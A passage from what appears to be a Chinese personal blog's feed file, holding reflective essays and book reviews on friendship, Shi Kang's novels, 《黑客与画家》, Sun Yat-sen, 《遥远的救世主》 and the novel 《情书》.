定，因此也就囫囵谈谈。</p><p>朋友是个高尚的词，唯内心坦荡，灵魂共鸣的人可互相称呼。除此之外，它也别无要求。陌生人、情人、亲人之间都可能成为朋友，他们之间都可能拥有友情。但可能并不意味着容易。如果“三杯酒下肚就可以唤你朋友”那人人都应该酗酒。只是残酷的是，连李白这样金樽不曾空对月的人终其一生的朋友也屈指可数。其实我们可以感觉到，点头之交的背后是人际信任的日渐式微，是慵懒和畏惧的不断侵蚀。我们何尝未曾幻想让阳光温暖赤子之心，只是寒风烈烈，削肌切骨，我们终于还是用谎言和假笑裹起了自己，一点点地变成了他人眼中的地狱。我们肤浅地交往着，苟且地谈论着，面目可憎地踽踽独行着，又神情悲愤地感时伤世着。我们有了点赞转发评论这样虽缺乏诚意却不费心力，虽古怪畸形却蔚然成风的交往方式，便不再常常有饮茶话旧，把酒问月的真情。我们有了夸张扭曲却博人眼球的社交平台聊天表情后，只要手指灵活，各种面具转换自如，嬉笑怒骂更是信手拈来。低头是个八面玲珑的性情中人，抬头却是个面部僵硬的冷眼看客。富贵时誓同生死的称兄道弟回头来却是患难时避而远之的泾渭分明。我很早就已不信，世上还会有许多真正能为朋友两肋插刀而至死不渝的人，后来我又开始怀疑，这样的人真的能有幸遇见值得这份对待的彼此吗？</p><p>亲人是大部分人一辈子的感动和羁绊。我们在漫天风雪里找到一间草庐，草庐里的人与我们共享维系生命的资源，我们彼此取暖，感激与爱护让我们紧紧相依，度过一个又一个短暂的冬天。我们忽远忽近，却不离不弃。我们始终没有离开草庐。被迫或胆敢离开的一小撮人也都接连死在了天地的肃杀中。我们更加不愿离开。一个又一个冬天过去了，我们依然没有离开。这让我不禁可耻地怀疑，这莫非是一个温柔的阴谋，一个甜蜜的枷锁。这样想着，我感到良心受着火烤一般。我又忍不住去问，孙悟空之所以是齐天大圣，莫不是因为他从石缝中出来？这样想着，我又感到无比地煎熬。毛主席说过，无情未必真豪杰。既然真豪杰都立如斯言，那我大概是杞人忧天了。</p><p>情人是寂寞最好的解药，也是世上最高明的毒药。荷尔蒙引起的快感虽不比海洛因，却也不失为一种很好的堕落。当女孩们白花花的大腿在我身旁耀眼地摇晃时，我感觉自己体内发生着一种奇异的变化，肾上腺素上去了，心不累了，神不乱了，难题不得解也不悲观厌世了。岁月是安平的，时光是静好的，阳光是温暖而不刺眼的，花儿是芳香而对我微笑的，屡试不第也愿意抱柱而死，天下纷乱只甘心化蝶双飞。我忍不住歌颂，忍不住赞美，忍不住向全世界夸耀这无与伦比的好东西。我也因此忘了我一点点流逝着的生命，好像一切可以永恒一样。我想这一定是上天赐予我的独一无二的恩宠，世上一定找不到第二样东西能让我那般快乐了。直到大腿们远去了。我陷入了深深的思考。我们所眷恋的，究竟是那一双双无比香艳的大长腿，还是那时的阳光和鲜花呢？如果换一双腿，我们会有同样的兴奋，还是有所谓情深缘浅的凄怆，抑或是比当时有过之而无不及的愉悦呢？柏拉图说，爱情是一种严重的精神疾病。那么治愈我们的究竟只能是她们还是恰好是她们呢？当我铿锵有力地质问完毕时，不禁感到内里空乏，底气不足，于是我红着脸在心里汪了两声。</p><p>鲁迅先生曾说，无尽的远方和无数的人们都和我有关。这真是一种浩瀚的真情啊。但我怀疑，那是些无数无尽的无所用心的对象。</p><p>日子很快，很多东西在变化，我自己也是，有时清醒，有时迷糊。每当问起自己这一生当如何度过，便又想起那句”陆然，你真的认为，在普通生活之外，还有更值得追求的东西吗？” ，接着就什么也想不起来。我不知道以后的自己会怎么想，正如已记不起过去的自己怎么想，所以唯一可做的就是，记下来当下的想法。但我知道这也是徒然，因为我已很难理解从前的自己偶有感触而兴致盎然地写下的东西。既然如此，那我们为什么还老想写点啥呢？因为毕竟，除此之外，还有什么，可以对抗，那不存在的敌人？</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>午后</title>
      <link href="/mind/160606Afternoon/"/>
      <url>/mind/160606Afternoon/</url>
      
        <content type="html"><![CDATA[<p>四月的一个下午，五点左右，我醒过来，有点迷糊。我走上阳台，四下张望。天空有些阴沉，风有些湿热，涌上来的是莫名而熟悉的压抑，楼下人来人往。有姑娘在人群中不动，在等待什么？显然她不等我，我不认识她。她眼神努力寻找，等得多么认真。她双手抱胸，手和胸间是文件夹，文件夹里会是什么？她脚尖踢着石子，石子并不存在。她脚踝纤细，在碎花裙下格外好看。她的身体随碎花裙轻轻晃动，在晚风中有些动人。动人的不是裙子，不是身体，是人群和黄昏，是和世界擦肩而过的平凡一天。在三万多个日子里，如果女孩在一万个黄昏这样等待，会等来什么？会有多少个刚睡醒的我在头顶看她，会有多少次她猛然抬头，显露出被窥视的惊慌或是不以为意的微笑。如果我在一万个黄昏这样醒来，会看到什么？会有怎样不同的风景任我观瞻，又会有多少不痛不痒的思绪游荡在我脑海。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>《我执》</title>
      <link href="/mind/160806HoldMyself/"/>
      <url>/mind/160806HoldMyself/</url>
      
        <content type="html"><![CDATA[<p>非其境者，不能摄受。从来如此。我想早迟是应当再读的。当下且先给这等待潮水抹煞的脚印留些描述，就算大家都不曾抑或不屑了解，无意甚或相约遗忘，我也舍不得抛弃那嚣张而可爱的姿态，忘不得他自顾自占领整个海岸，企图在天黑前包围大海的决心。</p><p>“我都知道了；这一切谎言与妄想，卑鄙与怯懦。它们就像颜料和素材，正好可以涂抹出一整座城市，以及其中无数的场景和遭遇。”</p><p>这写在《我执》的开始。似乎已得了看破妄想，舍得执着的大义。当看完全书，只是感慨差了些，凡成不得释迦都差了些。什么都不明白的最舒服，明了得多了，渐生出失望，更多一些，又有了希望，再多一些，就不望了，大概是明白了希望也是假的又不好意思说破。安静地忧郁着，理智地哀伤着，我看这是人世最真且爽的状态了。每个时代都有人前赴后继地奔跑着，他们不愿意追随前人，或者看着左边跑向右边，后来他们往往衣衫褴褛，白发苍苍，在街角迷了路。最后的最后，终究无法带着年轻身躯到达那看不见的城市的一群老汉在一座不知名城池破旧残败的墙根下看着布衣单剑，策马扬鞭，身无分文，却孤勇朝天的少年舍弃所有，义无反顾。咦，这画面有些熟悉，那一日到如今估摸着有一个甲子的光景了吧。当然也有一两个，早早不再怒吼咆哮，甚至不再窃窃低语，全心全意地做这美丽世界的美丽孤儿，智慧地笑对还在问“为什么”或者还在问“为什么还在问为什么”的孩子们。我虽然说不清那笑容里的成分，不过，我也知道了一些，这是谍中谍，这一场忙活，干的不是脚力，是心力。</p><p>一向觉得，知道的多的，说的少，说的多的，知道的少。而我等半懂不懂，想知难知的便整日哼哼唧唧，连做梦都免不得呓语一番，好像说得圆润些了也能悟得通透些一样。</p><p>其实我看这日记一样的文章，也有点像梦话，像是浮生一梦里的碎碎念。偶尔聪明，偶尔糊涂，偶尔拨云，偶尔雷霆，实在没有什么十分高明之处。若说高明，也许在更清楚的逻辑与更能写心之所想的文笔吧。你很精当地说出了我久郁于心的苦涩，使我仿佛得到春风化雨般的解脱，我便有些喜欢你了。然而许多人不明白，春雨的滋润过后还有炎夏的酷热，悲秋的萧索，寒冬的肃杀，以及年复一年轮回的煎熬。他们只是诧异，我曾心旷神怡，清明开悟，如今这又是怎么了呢？是啊，怎么了呢，令你开悟的人也不懂吧。</p><p>一般而言，散文集应该是不适合一口气看完，闲暇时翻翻，偶遇一两句动心之语更享受一些。然而我在不知道它是散文集的情况下懵懵懂懂一口气读完，倒也有了些更全局性的了解。虽然不了解背景，但我臆测作者似乎怀着情伤写的文字。开始还有所克制，反倒悟出些情场警语，摸索出些与《爱经》相契合的感悟，到了最后夜行如鬼的片段，深藏着的不安，彷徨，矛盾，痛苦一一浮现，作者带着年少时便有的叛逆，让我惊叹这行走在时间边缘的伟大勇气和竭力对抗桎梏的不凡探索。虽是散文集，内在的思想性态与思维模式却一脉相承，企图觉醒的波浪一阵高过一阵，在最后达到了令我瞠目结舌的高潮，更为奇异的是，这个过程平静的有些古怪，带着一种自残式的冷漠，仿佛看到白炽灯下作者鲜红的嘴角挂着的狞笑。这令许多人不寒而栗，但我会和他一起笑，割下自己的肉，就像割他的一样。我很欣赏这一丝冷漠带来的安慰，这令我觉得没有白花时间读他。</p><p>“你所见到的，只不过是自己的想象；你以为是自己的，只不过是种偶然。握得越紧越是徒然。此之谓我执。”</p><p>这是作者取自小乘佛法的感悟，但就通篇看来，也只是感悟感悟罢了。然而，即便如此也没有什么好苛求的，毕竟本不该奢望什么曲径通幽。相反的，倒应当感谢最后的一丝不透彻，如若没了它，我等也就欣赏不到另一个灵魂的垂死挣扎，辜负其自我解剖以供展览的好意，更演砸了作者精心编排的剧目。</p><p>归根结底，所谓我执，痛苦时才会寻求摆脱。对芸芸众生而言，这只是偶尔的跃迁，不可能成为常态的。用心看看，用心谢谢，用心笑笑，接着用心苟活就好了。当然，这是一些人对另一些人说的，但说话者本身才不会真正去做的，他们要挑战，像作者一样，挑战一切不可战胜的，质疑所有广泛认同的，拒绝全部理所当然的，赶在天黑之前，包围大海。</p><p>站在愚鲁者的角度，我有充分的理由把这当做一纸与命运妥协的契约，上面沾满了年少的鲜血和岁月的风尘，当不甘渐渐消弭，他将这良民证高高举过头顶，“你们看，我输了”。于是我们唏嘘感叹，又默默藏好自己的。</p><p>回过头来，我执是一切生产力的根本。虽然是自己抓着自己，想松开却是不易的，也是不舍得。我执是不可以大规模扼杀的，从这点上看，我王地狱不空誓不成佛的念想也令我有些疑惑。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>《一塌糊涂》</title>
      <link href="/mind/160501YiTaHuTu/"/>
      <url>/mind/160501YiTaHuTu/</url>
      
        <content type="html"><![CDATA[<h3 id="《一塌糊涂》"><a href="#《一塌糊涂》" class="headerlink" title="《一塌糊涂》"></a>《一塌糊涂》</h3><p>在继《晃晃悠悠》、《支离破碎》之后，我终于花了一整天时间完成了对石康青春三部曲中最后一部《一塌糊涂》的阅读。今天是二零一六年的劳动节，图书馆关了门，自习室少有人，大家都忙着去寻找乐趣了，然而于我而言，这一天与以往或是将来的任何一天不会有太大的分别。我在无所事事的心境下游荡，徘徊，找着一件能消磨时光又不那么令人厌恶的事情，一头扎进去，待到红日又西沉，感慨江水常东流。其实也算不得一整天。昨夜打球过度，回宿舍后疲惫不堪，甚至洗完澡也没有丝毫缓解，又作死与舍友一同订了双鸡堡与大鸡排。一行四人开着无关痛痒的玩笑，逗着重复而无新意的段子，偶尔冒出一两句有些愚蠢的俏皮话，一派其乐融融的景象。我不知道他们作何感想，反正我是感到极大的无趣，我不过是怕他们觉得无话可说的尴尬，若是独处，我是情愿终日无言的。吃过鸡排和汉堡，这垃圾食品满足了我短暂的口腹之欲，却在过后令我腹中有火烧之感，加上身体疲惫，不适感前所未有。吹干头发后连忙上床，企图通过睡眠缓解或是弥补这一切。说来睡眠真是好东西，它让我们耗散的精力得以填补，以此能够开始新的一日更加肆无忌惮、不知死活的耗散。有时睡醒后我总会想起王小波那句“以为自己会一直生猛下去”。其实我很难想象，但还是有些担心自己不能再生猛，不能再在打球时把地板跺得很响。嗯，虽然那种不适令我难以入眠，但没过多久，我还是睡着了。醒来已是九点半，我顿时被一种无所事事的感觉袭满全身。我不知道自己要干什么，要去哪里，我的价值在何处，我甚至无法确定自己的天赋。我只能看书，看各种书，或电影。企图从中找到一丝启发，一点安慰也好，渐渐的我发现那都没有什么用。我看得很慢，但忘得很快，我看到作者同我一样混乱的思路，不得要领的分析和草率的结论。也就是说，我基本一无所获。但我怎么会甘心呢，我还是得看啊，我得不断地试错。</p><p>于是一番来回走动后已是十二点多，我背上大书包，抄上《一塌糊涂》便踱着懒散的步子出发了。我打算先吃个饱饭来满足我的身体，再找个安静的地方安慰一下我的灵魂。我走在路上。路上人很少，我看到天空、白云、柏油路、绿树、青草、高大的建筑，我闻到花香、空气和美女。我走在路上，脑子里空空荡荡。我吃了个饭，脑子里空空荡荡。我现在看完了书，有很多想法捆在一起，毫无头绪，还不如空空荡荡。我这状态很糟，但我不希望别人觉得我亟待拯救或亟须向积极的方向改变。我执着地期待着，我应该有自己的出路。</p><p>石康在三十二岁左右，即二零零零年前后完成了三部曲的最后一部《一塌糊涂》。他说自己要把三部曲撕碎，抛在风中，并且到俗世里争取他应有的地位，去证明他应有的价值。而今十数年过去了，我不知道他近况如何，作何感想。是否在那一堆他看不上的人群中谋得一席之地。据说他近来出国了，希望他过得好吧。</p><p>其实本质上石康和我很相像，我总能在书中感受到一些似曾相识的想法或是一些还在孕育中的感悟。所以许多时候，我在阅读他时有种酣畅淋漓的快感。他出身普通，但热忱。我在完整地阅读过他的三部曲后对他的印象有了一个大致的概括。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">如何评价石康？</span><br><span class="line"></span><br><span class="line">东郭热，人生如逆旅，我亦是行人。</span><br><span class="line"></span><br><span class="line">对世界彻底的悲观失望以及自认为看清一切后的无所事事的晃晃悠悠状态下的上进与热爱生活</span><br><span class="line">有独立思考的能力</span><br><span class="line">质疑一切</span><br><span class="line">有逻辑</span><br><span class="line">能轻易看清现实世界的虚伪和矛盾，但自己也免不了虚伪和矛盾</span><br><span class="line">有文化的流氓</span><br><span class="line">骨子里的高傲和自负，对自己的分析和判断有很强的执念，能接纳新想法但很快就把新想法溶到自己的体系里。将将自洽，说服了自己又巧舌如簧地企图说服别人。</span><br><span class="line">热衷于生命的真相，不断的确认，然后否定。终究是困惑。</span><br><span class="line">坦诚。皮厚。达观。透彻。</span><br><span class="line">希望进入上层社会的渴望与求之不得的无奈与随之而来的不屑。</span><br><span class="line"></span><br><span class="line">爱真理又意识到了真理可能不存在。于是选择沉沦。但他天生善良，做不成彻底的坏人，所以只是嘴上说说书里写写偶尔试试。他还是去爱那令他无比困惑和痛苦的真相或已幻灭的人生。</span><br><span class="line">这是一个生具灵性，求道未得，战天斗地，睥睨先贤的勇士，也是一个孤独无助，进退维谷，曲高和寡，强颜欢笑的普通人。</span><br><span class="line"></span><br><span class="line">我尊敬他。</span><br><span class="line">祝他生活愉快。</span><br><span class="line"></span><br><span class="line">//这是个人从石康书中读出的石康，也或许只是是自己想象中的某个形象，主观臆断，言语偏颇，见谅。分享一二，但求指摘。</span><br><span class="line"></span><br><span class="line">https://www.zhihu.com/question/<span class="number">23669560</span>/answer/<span class="number">98330703</span></span><br></pre></td></tr></table></figure><p>石康在一塌糊涂中多次强调自己能力不足以干大事，这也许源于他不自知的自卑，或许源于他透彻的自我解剖。但是实际上，一个人是无法完全认清自己的。我也很期待多少年后某一天，我听说石康，在某个名利场中一举拔得头筹，举世喝彩。虽然我们都知道这毫无意义，但还是蛮有意思的吧。</p><p>和以往两次一样，寂寞而迷茫的周文到处嗅蜜，也就是撩妹。周文虽有嘴皮，但社会背景不优，圈子小且简陋，关键是没有钱，所以成果总是不尽如人意。而且周文的价值体系里没有忠贞这两个字，他嗅蜜总不容易，但也从不珍惜。也许是本性所致，也许是太爱思考的缘故，他可能珍惜不起来。不管怎样，这次的女孩叫嗡嗡，爱撒娇，一年后的千禧年前夕，他们掰了。然后在继对道德、宗教、信念、真善美、自由意志、意识等感到绝望之后，周文抑或是石康终于放弃从爱情中寻找人生真相的慰藉。</p><p>文中处处，我看到一草《那时年少》的痕迹。他们都说，那时，有个女孩，相信有一种感情使人们永远在一起并且不会改变，但他们自己不相信，一草说，他撒了谎，石康说他不爱撒谎。但不论如何，在千禧年前后，苏扬和童小语，周文和嗡嗡，他们之间，结束了实质上的联系，而随之结束的是青春里的纯真和对爱情的信赖。</p><p>我没有体验过，只是觉得那很悲壮，或许我的信念只将在呜咽一声过后悄然湮灭，了无踪迹。</p><p>石康觉得自己很牛逼，整个文明史整了一遍后高声宣布：我最屌，他们都是傻逼。但在残酷的物质生活的直接压迫下，他也还是承认：我有些无能。其实，我虽然还未看遍文明史，但有时我又何尝不是处于这种矛盾的心理状态呢。</p><p>对于石康，我很欣赏，但也觉得可悲。对我自己，也是一样。如果有命运，我不知道命运会给这一类人什么出路。我们拭目以待吧，如果值得的话。</p><p>2016.5.1 于厦大</p><p>2017.8.30 凌晨 整理 于厦大</p><hr><p><img src="59535aa2a9544.png" alt="一塌糊涂1.png"><br><img src="59535aa2bc78c.png" alt="一塌糊涂2.png"><br><img src="59535aa2c3f2d.png" alt="一塌糊涂3.png"></p><p><img src="59535aa298efe.png" alt="一塌糊涂4.png"></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>《黑客与画家》</title>
      <link href="/mind/160430HackerAndPainter/"/>
      <url>/mind/160430HackerAndPainter/</url>
      
        <content type="html"><![CDATA[<p>我想问问有什么值得追求？<br>昨天夜里十一时许，我在厦门大学上弦场完成了《黑客与画家》一书的阅读。彼时圆月当空，雾霾颇浓，四下人烟稀少，周遭空旷寂寥。我忽然觉得有点悲伤。想找一中问问，找南怀瑾问问，找佛陀问问，找老子问问，找庄子问问，找尼采问问，我这一生，究竟有什么值得追求？我不知道，真的不知道。</p><p>可其实我也知道，只是问问罢了。哪里有什么答案呢。一切真切地展现在我面前，了无意义，万般终成空。所唯一能做的，就是找一样物事，或某一个人，或一个念头，或某一种关系，沉醉进去，荒唐下去，以此终老。慢慢的，或许不甘，或许执着，最终要妥协。</p><p>如果有，或许技术算一种吧，但终归不那么热烈。</p><p>作者拥有独立的人格，这是应当学习的。在阅读的过程中给了我不少启迪。关于教育，关于思考，关于追求，他都有很独到的见解。这或许需要很长时间，很多的经历才有可能真正的了解，毕竟纸上得来终觉浅。我就是想的太多，做的太少吧。</p><p>近来感觉越发的辞不达意，言不成章，不知是浮躁了还是迷失了。可我一直都是浮躁和迷失的呀。那到底是怎么了呢？搞不懂。思来想去的有许多东西，可是下手写的时候却不知从何说起。我有时觉得他们所有人都很糟，有时觉得自己很糟，总之很少发现什么好的，这真像是一种病。为什么大多数人看起来都蛮开心的，他们没有困惑吗，还是他们解决了。为什么独独我常觉得失落，独独我难以走进人群呢？</p><p>大多数时候我享受一个人，但有时我承认我感到寂寞，这可以忍受，独独难以忍受的是我所追求的看起来没有答案。</p><p>我不知道我还能坚持多久，但我确实在一点点离开自己的理想国度。我想走近生活，抛弃那个高傲冷漠的自己，也许我能走近，也许不能，也许我会明白，也许我会迷失，但无论如何，回来的都不再是我了。</p><p>——————————————不知道写什么了。。。。。黑客与画家是我很愿意推荐的一本书 有空看看吧———就酱  夜深了 晚安世界  晚安阿威</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>《天下为公· 孙中山传》</title>
      <link href="/mind/160421PeopleWorld/"/>
      <url>/mind/160421PeopleWorld/</url>
      
        <content type="html"><![CDATA[<h3 id="天下何时为公"><a href="#天下何时为公" class="headerlink" title="天下何时为公"></a>天下何时为公</h3><p>曩路遇老叟，皮皱发白，手足不便，惟目神炯炯。同车而行，吾见其好自语，絮絮不止。遂移坐，近之以私听。虽词句杂然，未贯而成章，吾稍得大旨。盖感于时世之明，当朝之治，青年之多能，复叹于昔时之落后，彼年生计之艰，国力之衰，并技术之穷乏。由是数称非孙文之革新无今日之中国，孙公真贤士也。吾一心阴听，不觉俯身倾耳，为叟所察，自觉失礼，手足口失其所安。不意老叟不吾怪，反执吾手，眉目慈蔼，类极祖考，一时心乱。内之愈乱，则外须愈静。吾亦不致歉，展萌态以对之，直视其目之炯炯。俄而叟曰:尔辈当多读中山之作，悉其大义，扬其明旨，成其伟业。言毕复絮絮自语，若从前状。</p><p>今幸有暇，寻其传记以拜读，有二三感，且一发而后快。</p><p>孙文，又名中山，德明，逸仙，曾化名中山樵，高野长雄，中山二郎等。或曰“天子命”，遂幼名帝象。果命由天定，运在自为，孙公存世一甲子，虽位近天子，然则命途多舛，终不得享其成，虽威扬天下，终止于国之公器，不得帝王四海，尽遂其愿。中山之鹄的固不在帝位，然则非帝王不能成易四海之事，非帝王不能改苍生之命，非帝王不能开愚民之智。人之所以伟者，在于众皆从之。伟人之所以成事者，在于众皆恒从之而无疑。欲使无疑，一曰权，二曰智。权须天赋，苍生俯首，智须神来，天下为虏。权易得而智难求，非权无以广智，非智无以成权，夫惟权、智具足，可成万古不刊之大业。此亦润之之所以王而中山之所以寇者也。</p><p>文幼有将帅之好，常自诩“洪秀全”，率群童模拟征战，野心初显，此类极拿破仑，盖斯属之人志悉发于少。十三岁出国投兄孙眉，有“始见轮舟之奇，沧海之阔，自是有慕西学之心，穷天地之想”之感。此年少之志，终不得践，西学有成而天地不可穷。西学亦不足以为穷天地之资。以故其半生飘零，似无头蝇，作意气事，败垂成功。二十六岁前，为学长才。此后二十年间，旅居海外，三民之论渐成体系，力彰己见，扬其名氏共思虑于四海，所凭惟口舌之利与不懈之心。欧美驱逐，伦敦蒙难，流离颠沛，其实可哀，而民智得稍启，有士同揭竿，亦足可慰。四十五岁，武昌起义，孙文坐食其果，所仗亦廿载飘零广告之功，彼时天下，舍文其谁？此乘天时也。</p><p>孙文素好毁其旧者，若夫何以建其新者，则思虑天真，略乏才智。向所欲毁者骤毁于前，文睹其残垣，不知何以立。破立之道，更迭之本也。破之易而立之难也。呕心沥血，寤寐难眠，不足以立，遂孙文拱手强权，袁贼取天下以反掌。天意使文徒具打砸之勇而无帝王之才，天意使黎民一场空喜，惨蒙驱虎引狼之灾，吾实痛心而不可奈何。一念误而添十年劳，亦必时之未至也。文终于草寇一生，天位留予后来人。</p><p>观文之生平，真可谓为国为民，鞠躬尽瘁。虽功不可没，吾为之一叹。其功在启民智，而不在易江山，卸磨，杀之。哽咽无言，亦复向之叹息，人皆为时、运、命所虏，不能自已，其实可哀。</p><p>吾以为，民智可开否诚不可知。苟可期，民智之开亦必速在庠序之教。民智得开则旧陈得破，贤者之聪方可立新。民智，贤者皆不易具，吾疑天下犹不系之舟，诚可怖也，实大惑也。破立之事，可速为乎？破立往复，可有不破之立？抑或不立之破？吾生而有涯，破立有涯乎？有径乎？皆尚不可知也。</p><p>吾亦时有穷天地之想，然则天地何在？前路莫非穷途？</p><p>　　                             乙未年十一月</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>《晃晃悠悠》+《支离破碎》</title>
      <link href="/mind/160421WanderBroken/"/>
      <url>/mind/160421WanderBroken/</url>
      
        <content type="html"><![CDATA[<h3 id="《晃晃悠悠》-《支离破碎》"><a href="#《晃晃悠悠》-《支离破碎》" class="headerlink" title="《晃晃悠悠》+《支离破碎》"></a>《晃晃悠悠》+《支离破碎》</h3><p><img src="59533ae7e4eda.png" alt="【读后感】晃晃悠悠+支离破碎0.png"></p><p><img src="59533ae7d948a.png" alt="【读后感】晃晃悠悠+支离破碎1.png"></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>《遥远的救世主》</title>
      <link href="/mind/160421FarawayChrist/"/>
      <url>/mind/160421FarawayChrist/</url>
      
        <content type="html"><![CDATA[<p>遥远的救世主</p><blockquote><p>在强者与弱者之间，</p><p>自己是一个多余的人！</p><p>在道德与败坏之间，</p><p>自己是一个多余的人！</p><p>世界太大了，</p><p>大得能包容罪恶、阴谋、眼泪……</p><p>世界又太小了，</p><p>小得竟然没有他刘冰的一块立锥之地……</p><p>他爬上窗户，</p><p>既像胜利者又像受了委屈的孩子一样</p><p>对着夜空大声喊道：“丁元英，你撒谎啦！你撒谎啦……”</p><p>然后纵身一跳。</p><p>接着，地面传来一声沉闷的声响。<br>                        ——《遥远的救世主》</p></blockquote><p>本书通过一个主要故事试图向读者展示文化属性对于人生道路的主宰性作用并揭露了中华民族传统文化中倚赖和期待救世主的劣根性。</p><p>男主角是丁元英，一个游刃于经济领域，善于谋算的聪明人，一个精于佛道，追问人生究竟的觉者，一个沉默寡言，畏惧女人，不问功名的退隐者。</p><p>女主角是芮小丹，美女，有慧根，有佛性，也许算是降了丁元英。</p><p>丁从股市退出后到古城隐居，和芮相遇。芮爱上了丁并不顾一切地追求。丁被动地接受。两人讨论文化属性的问题。芮要丁为其写一个神话——帮助县城里的一个极度贫困村脱贫。也以此研究文化属性地优劣是否真的会带来那么巨大的影响。</p><p>丁利用市场竞争的边缘手段酿造了一个阴谋，帮助农民跻身资本市场。三个农村的年轻人作为分别代表这个实验的三个结果——冯世杰，有所觉悟。叶晓明，退回原地。叶冰，从井沿看了一眼更大的世界后掉回去的井底之蛙，同时得了精神绝症，成了这场失败实验的牺牲品，自杀。</p><p>归根结底，他们还是把丁元英看成了救世主，没有明白只有自救方能得救的道理。</p><p>基督教让他们靠上帝，佛教让他们靠佛恩，传统文化给了农民什么？谁来给农民做主？农民的得救之道在哪里？</p><p>丁元英说：“传统文化是皇天在上的文化，是救主、救恩的文化。如果一个民族的文化从骨子里就是弱势文化属性，怎么可能去承载强势文化的政治、经济？衡量一种文化属性不是看它积淀的时间长短，而是看它与客观规律的距离远近。五千年的文化是光辉、是灿烂，这个没有问题。但是，传统和习俗得过过客观规律的筛子。”</p><p>这场实验的失败恰恰验证了丁的另一句话“不该作为的不作为就是作为”。</p><p>得救之道何在，这是个问题。一个一说就错的问题。</p><p>我想作者所说的救世主是客观规律。</p><p>丁元英说：“你自性本来，无需知道。这是根性的范畴，不是根器、智慧。我呢？就在那里参哪参哪，没完没了，越想活个明白就越不明白，一直参到了死胡同里出不来，就蹲在墙根打瞌睡。”</p><p>看来做一个晃晃悠悠的人没什么，只是要有足够的能力在这世间立足便是。</p><p>等我有钱了，就找个地方躲起来。▁▂▃▄▅▆▇█▇▆▅▄▃▂▁▁▂▃▄▅▆▇█▇▆▅▄▃▂▁<br>☻…☺…☻…☺…☻…☺…☻…☺…▁▂▃▄▅▆▇█▇▆▅▄▃▂▁▁▂▃▄▅▆▇█▇▆</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>《孩子王》</title>
      <link href="/mind/160419ChildKing/"/>
      <url>/mind/160419ChildKing/</url>
      
        <content type="html"><![CDATA[<p><img src="59533ae7eb3ad.png" alt="【读后感】孩子王.png"></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>《情书》</title>
      <link href="/mind/151118LoveLetter/"/>
      <url>/mind/151118LoveLetter/</url>
      
        <content type="html"><![CDATA[<p>高中时代看一个样貌清秀女孩手捧《情书》在窗边读  ，阳光泻在侧脸，长发如瀑，双肩瘦削，领口的脖颈肤白胜雪，画面太美，不敢多看。然而还是一眼望尽，也立刻记住了岩井俊二这个古怪的日本名字。当时我想，这名字看似逼格颇高，有空我也得读读才成。然而好长一段时间里，再没记起那个场景，今日不知怎的，忽然忆起，打算一读《情书》，权当消磨这心乱如麻的午后。</p><p>剧透的序最惹人厌，读罢整个故事便十分了然，他日我若为人作序，定只说破三分，留七分光景予人想往。看得见结局的开头会败了整个故事的兴味，就像一眼瞧得到头的人生并无多大活头。</p><p>缘起在于一男一女的藤井树，他们是中学同学，因为同名同姓的缘故受同学撮合，女方无甚感觉，而作为“闷蛋”的男方却有些入戏。自然像大多年少的故事一样，这份奇特的缘分无疾而终。可他是足够幸运的，多年后遇上了和女藤井树样貌相似度颇高的博子并且几乎要步入婚姻的殿堂。然而人生诸多时候就是差那么一点点，即便耗尽所有运气也无力回天，男藤井树在婚前的一次登山中意外身亡。三年后博子又将和玻璃匠茂成婚。婚前误将女藤井树的住址当做男藤井树生前住址，与女藤井树有了几次的书信来往，一点点揭开了尘封往事。</p><p>男藤井树是一个看历史和哲学以及《追忆似水年华》的人们眼中古怪的人和女藤井树眼中的“闷蛋”。他无意之中一点点堕入自己编织的情网，后来又悄无声息毅然决然地离开，明面上是对老师同学的“误会”的反抗，实则我料想大概是受不得日复一日的自我煎熬，企图用骄傲的离开换一个从容的背影，用潇洒的远去掩住慌乱的眼神。然而他万万没有料到的是那些闷着的日子里出现过的阳光早已给他的人生打下了不可磨灭的水印，以至于后来的人那样像是从前的替代品，这是一种不负责任的自私，却也是令人动容的真情，值得理解的荒唐。令我愉快的是故事并没有这样走向结局，我很赞同作者，再度离开才是他最好的归宿。</p><p>女藤井树不属于他，博子同样不属于，或许，他和松田圣子比较好一些，毕竟最后的时间里，他没有想到自己的未婚妻博子，甚至也没有想到女藤井树，他只是唱着松田圣子的“我的爱随南风而逝…”，然后告别了这个世界。他的心中，只剩下求不得的苦。这让我不禁想起李宗盛的《山丘》——向情爱的挑逗，命运的左右，不自量力地还手，直至死方休。真是无比真实而残忍的写照。故事的最后，《追忆似水年华》戏剧般地被女藤井树捧在手中，阿树拿着它，无声的看着。上面有一幅清纯、仔细的素描。这是她的脸孔。于男藤井树而言，也算是人生有个圆满的交代，死也值了。</p><p>对比之下，博子的境遇就有些糟糕。毕竟无论于谁，被当做替代品都是对于已经付出的感情的莫大羞辱，也是对于多年念念不忘的真心的无情嘲讽。颇有些“越过山丘，才发现无人等候”的苦楚。然而那又如何，时过境迁，一切都不得不被原谅，怪不得谁，你有心，我也曾愿意。还好生活留给她一个瓦，因害怕失去而如履薄冰地爱着她的瓦。</p><p>这样看来就形成了一个古怪的关系链。真情的瓦爱着对另一个男人念念不忘的博子，痴情的博子无法放下只是将对另一个女人的真心寄托在她身上的男藤井树。女藤井树时隔多年才明白当初那个男孩的炽热，而男孩已经不再，博子事过境迁才了然那个男人的炽热并不为她，而她已无可诉说。博子终将嫁给瓦，生活也终于将所有人糟蹋。</p><p>哈哈，不能原谅却无法阻挡，谁在你心里放冷枪。</p><p>事情常常是这样，一点也抵不过命运的作弄。然而，多年后的一封情书——“阿树，你